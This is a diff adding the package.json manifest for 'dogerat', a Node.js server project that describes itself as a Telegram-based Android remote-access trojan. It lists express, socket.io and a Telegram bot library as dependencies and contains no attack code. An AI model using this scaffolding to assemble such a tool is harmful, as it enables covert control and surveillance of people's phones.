@@ -1,0 +1,16 @@
+{
+  "name": "dogerat",
+  "version": "1.0.0",
+  "description": "A multifunctional Telegram based Android RAT without port forwarding.",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "socket.io": "^4.7.2",
+    "node-telegram-bot-api": "^0.61.0"
+  },
+  "author": "shivaya-dav",
+  "license": "ISC"
+}
